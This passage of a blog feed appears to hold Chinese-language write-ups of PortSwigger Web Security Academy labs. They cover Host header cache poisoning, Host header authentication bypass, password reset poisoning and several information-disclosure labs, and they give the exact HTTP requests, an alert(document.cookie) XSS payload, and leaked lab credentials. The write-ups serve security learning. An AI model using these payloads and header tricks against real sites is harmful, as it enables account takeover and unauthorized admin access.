&lt;li>点击最上方&lt;code>Go to exploit server&lt;/code>，并修改&lt;code>File&lt;/code>为&lt;code>/resources/js/tracking.js&lt;/code>，&lt;code>Body&lt;/code>为&lt;code>alert(document.cookie)&lt;/code>，然后修改步骤1请求，多次发送请求直到&lt;code>X-Cache: hit&lt;/code>
&lt;img alt="Exploit server" src="/img/2024/host-header-attack-lab-host-header-web-cache-poisoning-via-ambiguous-requests-2.jpg">
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /product?productId=1 &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a4a00160450455f8172532c00720096.h1-web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">exploit-0ae900e10445456481d65290015c00a2.exploit-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Cache: hit
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>访问主页即可解题
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> / &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a4a00160450455f8172532c00720096.h1-web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">exploit-0ae900e10445456481d65290015c00a2.exploit-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Cache: miss
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Host header authentication bypass</title><link>/portswigger-posts/host-header-attack-lab-lab-host-header-authentication-bypass/</link><pubDate>Sun, 22 Dec 2024 23:01:39 +0800</pubDate><guid>/portswigger-posts/host-header-attack-lab-lab-host-header-authentication-bypass/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-lab-host-header-authentication-bypass-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-lab-host-header-authentication-bypass-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>访问&lt;code>/admin&lt;/code>
&lt;img alt="Admin" src="/img/2024/host-header-attack-lab-lab-host-header-authentication-bypass-2.jpg">&lt;/li>
&lt;li>根据题目提示&lt;code>基于 HTTP Host 头对用户的权限级别进行假设&lt;/code>，修改步骤1请求&lt;code>Host&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">localhost&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;section&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;h1&amp;gt;Users&amp;lt;/h1&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;div&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;span&amp;gt;wiener - &amp;lt;/span&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;a href=&amp;#34;/admin/delete?username=wiener&amp;#34;&amp;gt;Delete&amp;lt;/a&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;/div&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;div&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;span&amp;gt;carlos - &amp;lt;/span&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;a href=&amp;#34;/admin/delete?username=carlos&amp;#34;&amp;gt;Delete&amp;lt;/a&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;/div&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/section&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>修改url并发送请求后即可解题
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin/delete?username=carlos &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">localhost&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Basic password reset poisoning</title><link>/portswigger-posts/host-header-attack-lab-host-header-basic-password-reset-poisoning/</link><pubDate>Sun, 22 Dec 2024 22:06:09 +0800</pubDate><guid>/portswigger-posts/host-header-attack-lab-host-header-basic-password-reset-poisoning/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击&lt;code>My account&lt;/code>并点击&lt;code>Forgot password?&lt;/code>，并输入&lt;code>wiener&lt;/code>，对应请求如下
&lt;img alt="Login" src="/img/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning-2.jpg">
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a16009403d415b6d5e881ad008a004c.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=nYHLZecComsDUANkqK08uANGbcCZYk6X&amp;amp;username=wiener
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>点击最上方&lt;code>Go to exploit server&lt;/code>、&lt;code>Email client&lt;/code>，重置的链接如下
&lt;img alt="Email client" src="/img/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning-3.jpg">&lt;/li>
&lt;li>回到主页再次点击&lt;code>My account&lt;/code>、&lt;code>Forgot password?&lt;/code>，并使用Burp Intercept拦截请求后发送到Burp Repeater，并修改&lt;code>Host&lt;/code>为&lt;code>exploit-server&lt;/code>后发送
&lt;img alt="Login" src="/img/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning-4.jpg">
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">exploit-0ad000c8038915a8d5c5801601700056.exploit-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=gzFCxNImVsCRkkDFSz0WzmSIjVO79eyc&amp;amp;username=carlos
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>点击最上方&lt;code>Go to exploit server&lt;/code>、&lt;code>Access log&lt;/code>
&lt;img alt="Access log" src="/img/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning-5.jpg">&lt;/li>
&lt;li>访问&lt;code>/forgot-password?temp-forgot-password-token=5m63f7q3b6e7sh9s1bd6tb3hksjl8a7v&lt;/code>
&lt;img alt="Password reset" src="/img/2024/host-header-attack-lab-host-header-basic-password-reset-poisoning-6.jpg">&lt;/li>
&lt;li>使用&lt;code>carlos&lt;/code>与修改后的密码登录即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Information disclosure in version control history</title><link>/portswigger-posts/information-disclosure-lab-infoleak-in-version-control-history/</link><pubDate>Sun, 22 Dec 2024 20:58:00 +0800</pubDate><guid>/portswigger-posts/information-disclosure-lab-infoleak-in-version-control-history/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-in-version-control-history-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-in-version-control-history-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>通过枚举工具(例如&lt;code>gobuster&lt;/code>)，获得目标url&lt;code>/.git&lt;/code>
&lt;img alt="Git url" src="/img/2024/information-disclosure-lab-infoleak-in-version-control-history-2.jpg">&lt;/li>
&lt;li>通过&lt;code>curl&lt;/code>将&lt;code>/.git&lt;/code>下载到本地
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ wget -r https://0a71001f0385f2e680a2d05f00890056.web-security-academy.net/.git
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cd 0a71001f0385f2e680a2d05f00890056.web-security-academy.net/.git
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ git log
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>commit 80e7a7b5d124b8aaed33c91e19ce74ebf75be56b &lt;span style="color:#f92672">(&lt;/span>HEAD -&amp;gt; master&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Author: Carlos Montoya &amp;lt;carlos@carlos-montoya.net&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Date: Tue Jun &lt;span style="color:#ae81ff">23&lt;/span> 14:05:07 &lt;span style="color:#ae81ff">2020&lt;/span> +0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Remove admin password from config
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>commit 21ea1423ac98788feb9be6e60815e568e10b313b
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Author: Carlos Montoya &amp;lt;carlos@carlos-montoya.net&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Date: Mon Jun &lt;span style="color:#ae81ff">22&lt;/span> 16:23:42 &lt;span style="color:#ae81ff">2020&lt;/span> +0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Add skeleton admin panel
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ git show 80e7a7b5d124b8aaed33c91e19ce74ebf75be56b
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>commit 80e7a7b5d124b8aaed33c91e19ce74ebf75be56b &lt;span style="color:#f92672">(&lt;/span>HEAD -&amp;gt; master&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Author: Carlos Montoya &amp;lt;carlos@carlos-montoya.net&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Date: Tue Jun &lt;span style="color:#ae81ff">23&lt;/span> 14:05:07 &lt;span style="color:#ae81ff">2020&lt;/span> +0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Remove admin password from config
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>diff --git a/admin.conf b/admin.conf
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>index d256cbe..21d23f1 &lt;span style="color:#ae81ff">100644&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>--- a/admin.conf
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+++ b/admin.conf
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>@@ -1 +1 @@
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-ADMIN_PASSWORD&lt;span style="color:#f92672">=&lt;/span>zq9gi2jl81wpv0bdwqgd
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+ADMIN_PASSWORD&lt;span style="color:#f92672">=&lt;/span>env&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;ADMIN_PASSWORD&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>通过&lt;code>administrator:zq9gi2jl81wpv0bdwqgd&lt;/code>登录，点击右上方&lt;code>Admin panel&lt;/code>，并点击&lt;code>carlos - Delete&lt;/code>即可解题
&lt;img alt="Admin panel" src="/img/2024/information-disclosure-lab-infoleak-in-version-control-history-3.jpg">&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Authentication bypass via information disclosure</title><link>/portswigger-posts/information-disclosure-lab-infoleak-authentication-bypass/</link><pubDate>Sun, 22 Dec 2024 20:36:07 +0800</pubDate><guid>/portswigger-posts/information-disclosure-lab-infoleak-authentication-bypass/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-authentication-bypass-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-authentication-bypass-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
&lt;li>访问&lt;code>/admin&lt;/code>
&lt;img alt="Admin" src="/img/2024/information-disclosure-lab-infoleak-authentication-bypass-2.jpg">&lt;/li>
&lt;li>尝试使用&lt;code>TRACE&lt;/code> method访问&lt;code>/admin&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">TRACE&lt;/span> /admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Custom-IP-Authorization: 141.11.46.54
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>新增&lt;code>X-Custom-Ip-Authorization: 127.0.0.1&lt;/code>，并再次使用&lt;code>GET&lt;/code>method访问&lt;code>/admin&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Custom-Ip-Authorization: 127.0.0.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>通过Burp Poxy自动在每个请求中新增&lt;code>X-Custom-Ip-Authorization: 127.0.0.1&lt;/code>，点击&lt;code>Proxy settings&lt;/code>，并下滑到&lt;code>HTTP match and replace rules&lt;/code>点击&lt;code>add&lt;/code>
&lt;img alt="HTTP match and replace rules" src="/img/2024/information-disclosure-lab-infoleak-authentication-bypass-3.jpg">&lt;/li>
&lt;li>通过浏览器访问&lt;code>/admin&lt;/code>可看到管理页面，点击&lt;code>carlos - Delete&lt;/code>后即可解题
&lt;img alt="Admin" src="/img/2024/information-disclosure-lab-infoleak-authentication-bypass-4.jpg">&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Source code disclosure via backup files</title><link>/portswigger-posts/information-disclosure-lab-infoleak-via-backup-files/</link><pubDate>Sun, 22 Dec 2024 20:26:27 +0800</pubDate><guid>/portswigger-posts/information-disclosure-lab-infoleak-via-backup-files/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-via-backup-files-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-via-backup-files-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>访问&lt;code>/robots.txt&lt;/code>url，内容如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>User-agent: *
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Disallow: /backup
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>访问&lt;code>/backup&lt;/code>url，内容如下
&lt;img alt="Backup files" src="/img/2024/information-disclosure-lab-infoleak-via-backup-files-2.jpg">&lt;/li>
&lt;li>点击&lt;code>ProductTemplate.java.bak&lt;/code>后可以看到&lt;code>postgresql&lt;/code>的连接密码
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">ProductTemplate&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Serializable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">readObject&lt;/span>(ObjectInputStream inputStream) &lt;span style="color:#66d9ef">throws&lt;/span> IOException, ClassNotFoundException
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> inputStream.&lt;span style="color:#a6e22e">defaultReadObject&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ConnectionBuilder connectionBuilder &lt;span style="color:#f92672">=&lt;/span> ConnectionBuilder.&lt;span style="color:#a6e22e">from&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;org.postgresql.Driver&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;postgresql&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;localhost&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 5432,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;postgres&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;postgres&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;n8r1bjlxpxzzsmjo692mxd67qtw1wfqj&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ).&lt;span style="color:#a6e22e">withAutoCommit&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>回到主页后点击最上方&lt;code>Submit solution&lt;/code>并填入密码即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Information disclosure on debug page</title><link>/portswigger-posts/information-disclosure-lab-infoleak-on-debug-page/</link><pubDate>Sun, 22 Dec 2024 20:17:39 +0800</pubDate><guid>/portswigger-posts/information-disclosure-lab-infoleak-on-debug-page/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-on-debug-page-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-on-debug-page-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>在进入Lab首页时，查看源码会找到php管理页面
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&amp;lt;!-- &amp;lt;a href=/cgi-bin/phpinfo.php&amp;gt;Debug&amp;lt;/a&amp;gt; --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>访问&lt;code>/cgi-bin/phpinfo.php&lt;/code>后搜索&lt;code>SECRET_KEY&lt;/code>，将结果填入&lt;code>Submit solution&lt;/code>内即可解题
&lt;img alt="SECRET_KEY" src="/img/2024/information-disclosure-lab-infoleak-on-debug-page-2.jpg">&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Information disclosure in error messages</title><link>/portswigger-posts/information-disclosure-lab-infoleak-in-error-messages/</link><pubDate>Sun, 22 Dec 2024 20:08:27 +0800</pubDate><guid>/portswigger-posts/information-disclosure-lab-infoleak-in-error-messages/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/information-disclosure-lab-infoleak-in-error-messages-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
